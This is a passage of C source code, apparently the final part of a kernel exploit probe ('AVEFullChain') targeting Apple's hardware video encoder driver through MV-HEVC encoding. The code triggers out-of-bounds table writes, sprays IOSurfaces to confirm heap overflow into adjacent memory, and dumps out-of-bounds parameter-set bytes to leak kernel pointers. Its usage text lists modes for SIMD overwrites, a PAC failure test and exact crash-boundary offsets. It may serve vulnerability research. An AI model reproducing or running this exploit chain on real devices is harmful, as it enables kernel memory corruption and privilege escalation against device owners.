                VTCompressionSessionInvalidate(spray_sessions[i]);
                CFRelease(spray_sessions[i]);
            }

    } else if (strcmp(mode, "table2_heap") == 0) {
        rlog("TABLE2_HEAP: Second VPS table OOB + IOSurface spray test\n");
        rlog("Both VPS tables overflow simultaneously during MV-HEVC encoding.\n");
        rlog("NOTE: Buffer is 0x9B10 bytes in 0xC000 kalloc.49152 allocation.\n");
        rlog("Table 2 OOB at 197 enc reaches +0xA2E4 — within allocation padding.\n");
        rlog("Cross-allocation needs 1057 entries (~352 enc) — past crash limit.\n");
        rlog("This test checks: a) if table 2 OOB corrupts driver state at +0x8DF4-0x9B10\n");
        rlog("  b) if IOSurface spray lands in adjacent allocation (observable via readback)\n");
        rlog("Table 1 hits +0x5C70 at entry 592 → crash at ~197 encodes.\n\n");
        if (phase1_verify() != 0) goto done;

        int t2_encodes = (argc > 2) ? atoi(argv[2]) : 170;
        int t2_lid = (argc > 3) ? (int)strtol(argv[3], NULL, 0) : 0x4141;
        if (t2_encodes > 195) {
            rlog("WARNING: >195 encodes risks table 1 +0x5C70 crash at ~197!\n");
            rlog("Clamping to 195.\n");
            t2_encodes = 195;
        }

        rlog("--- Step 1: Pre-spray %d IOSurfaces ---\n", SPRAY_COUNT/2);
        for (int i = 0; i < SPRAY_COUNT/2; i++)
            g_surfaces[i] = create_spray_surface(i);

        rlog("--- Step 2: Create MV-HEVC encoder (lid=0x%x) ---\n", t2_lid);
        VTCompressionSessionRef t2s = create_mvhevc_encoder(128, 128, t2_lid);
        if (!t2s) {
            rlog("FAILED: Could not create encoder\n");
            for (int i = 0; i < SPRAY_COUNT/2; i++)
                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
            goto done;
        }

        rlog("--- Step 3: Post-spray %d more IOSurfaces ---\n", SPRAY_COUNT/2);
        for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
            g_surfaces[i] = create_spray_surface(i);

        rlog("--- Step 4: Encode %d frames (table 2 heap overflow at ~155) ---\n", t2_encodes);
        int t2_errors = 0;
        for (int i = 0; i < t2_encodes; i++) {
            int st = encode_one(t2s, i, 128, 128);
            if (st != 0) {
                t2_errors++;
                rlog("[%d] Error: %d\n", i, st);
                if (t2_errors >= 5) break;
            }
            if ((i+1) % 25 == 0 || i == t2_encodes-1) {
                int t1_entries = (i+1) * 3;
                int t2_entries = (i+1) * 3;
                const char *t1_state = "pre-OOB";
                if (t1_entries >= 592) t1_state = "DANGER: +0x5C70 hit!";
                else if (t1_entries >= 256) t1_state = "OOB (safe range)";
                const char *t2_state = "pre-OOB";
                if (t2_entries >= 466) t2_state = "HEAP OVERFLOW ACTIVE";
                else if (t2_entries >= 256) t2_state = "intra-buffer OOB";
                rlog("[%d/%d] T1: ~%d entries (%s) | T2: ~%d entries (%s)\n",
                     i+1, t2_encodes, t1_entries, t1_state, t2_entries, t2_state);
            }
        }

        VTCompressionSessionCompleteFrames(t2s, kCMTimeInvalid);
        usleep(500000);

        rlog("\n--- Step 5: Check spray surfaces for corruption ---\n");
        int t2_corrupted = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            IOSurfaceLock(g_surfaces[i], 1, NULL);
            void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
            if (base) {
                uint32_t *p32 = (uint32_t *)base;
                int changes = 0;
                for (int j = 2; j < 9216; j++) {
                    if (p32[j] != 0xAAAAAAAA) {
                        if (!changes) {
                            rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x\n",
                                 i, j*4, p32[j]);
                            for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
                                rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
                                     p32[k] != 0xAAAAAAAA ? " *" : "");
                        }
                        changes++;
                    }
                }
                if (changes) {
                    t2_corrupted++;
                    rlog("  Surface[%d]: %d words changed\n", i, changes);
                }
            }
            IOSurfaceUnlock(g_surfaces[i], 1, NULL);
        }

        rlog("\nCorrupted surfaces: %d / %d\n", t2_corrupted, SPRAY_COUNT);
        if (t2_corrupted > 0) {
            rlog("*** TABLE 2 HEAP OVERFLOW INTO ADJACENT IOSurface CONFIRMED ***\n");
            rlog("*** layer_id=0x%x values should appear at byte position 4 ***\n", t2_lid);
        } else {
            rlog("No corruption detected. Possible reasons:\n");
            rlog("  - HEVC buffer not adjacent to any spray surface\n");
            rlog("  - Table 2 not written during MV-HEVC (needs on-device verification)\n");
            rlog("  - Entries per encode differ from expected ~3\n");
        }

        VTCompressionSessionInvalidate(t2s); CFRelease(t2s);
        for (int i = 0; i < SPRAY_COUNT; i++)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }

    } else if (strcmp(mode, "safe_max") == 0) {
        rlog("SAFE_MAX: Maximum safe encodes (196) with corruption check\n");
        rlog("Entry 591 (~197 enc) is the last safe entry before +0x5C70 crash\n");
        rlog("This maximizes OOB corruption without triggering pointer crash\n\n");
        int sm_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("layer_id=0x%x, 196 encodes\n\n", sm_lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(196, sm_lid);

    } else if (strcmp(mode, "pset_dump") == 0) {
        rlog("PSET_DUMP: Dump raw parameter set bytes after overflow\n");
        rlog("After counter inflation, CMVideoFormatDescriptionGetHEVCParameterSetAtIndex\n");
        rlog("reads OOB entries. We dump the raw bytes to look for kernel pointers.\n\n");
        int encodes = (argc > 2) ? atoi(argv[2]) : 300;
        if (phase1_verify() != 0) goto done;

        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
        if (!s) goto done;

        rlog("Encoding %d frames to inflate counter...\n", encodes);
        for (int i = 0; i < encodes; i++) {
            int st = encode_one(s, i, 128, 128);
            if (st != 0 && i < 5) rlog("[%d] Error: %d\n", i, st);
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);

        rlog("\nFinal encode to get OOB parameter sets...\n");
        int st = encode_one(s, encodes, 128, 128);
        rlog("Status: %d, pset_count=%zu, pset_bytes=%zu\n",
             st, g_last_pset_count, g_last_pset_total_bytes);

        rlog("\nDumping parameter set raw bytes:\n");
        CMSampleBufferRef last_buf = NULL;
        // Re-encode to capture buffer in callback
        g_encode_done = 0;
        CVPixelBufferRef pb = create_pb(128, 128);
        if (pb) {
            CMTime pts = CMTimeMake(encodes+1, 30);
            CMTime dur = CMTimeMake(1, 30);
            VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
            for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
            CVPixelBufferRelease(pb);
        }

        rlog("pset_count=%zu after re-encode\n", g_last_pset_count);
        rlog("If count > baseline (3), extra entries are OOB kernel heap data\n");

        VTCompressionSessionInvalidate(s); CFRelease(s);

    } else {
        rlog("Usage: AVEFullChain <mode> [args]\n\n");
        rlog("Modes:\n");
        rlog("  quick      -- Phases 1-3: verify + measure + 100 encodes\n");
        rlog("  standard   -- Phases 1-4: + 250 encodes + OOB read test\n");
        rlog("  full       -- All 6 phases: complete chain test\n");
        rlog("  blraa      -- Firmware with lid=1 (WILL PANIC if PAC fails!)\n");
        rlog("  read_only  -- OOB read only (400 encodes)\n");
        rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
        rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
        rlog("  table2_heap [enc] [lid] -- Table 2 OOB + IOSurface spray test\n");
        rlog("  safe_max [lid]   -- Maximum safe encodes (196) before crash\n");
        rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
        rlog("  simd_safe [lid]  -- 210 encodes, stop BEFORE SIMD overwrite\n");
        rlog("  cumsum_predict   -- Measure NAL sizes, predict cumsum at entry 601\n");
        rlog("  dual             -- Multi-session spray + cross-buffer + victim trigger\n");
        rlog("  pset_dump [enc]  -- Dump raw parameter set bytes for kernel pointer leak\n");
        rlog("\nKey entry thresholds (TABLE 1):\n");
        rlog("  256 (~86 enc):  First OOB write\n");
        rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
        rlog("  592 (~197 enc): +0x5C70 TARGET POINTER — CRASH BOUNDARY\n");
        rlog("  *** Entries 593+ UNREACHABLE from table 1 without crash ***\n");
        rlog("\nKey entry thresholds (TABLE 2):\n");
        rlog("  256 (~86 enc):  First OOB write (intra-buffer, 53 driver fields)\n");
        rlog("  466 (~155 enc): Past buffer content (into alloc padding)\n");
        rlog("  1057 (~352 enc): Past allocation end (UNREACHABLE, crash at 197)\n");
    }

done:
    rlog("\n=== Full chain probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
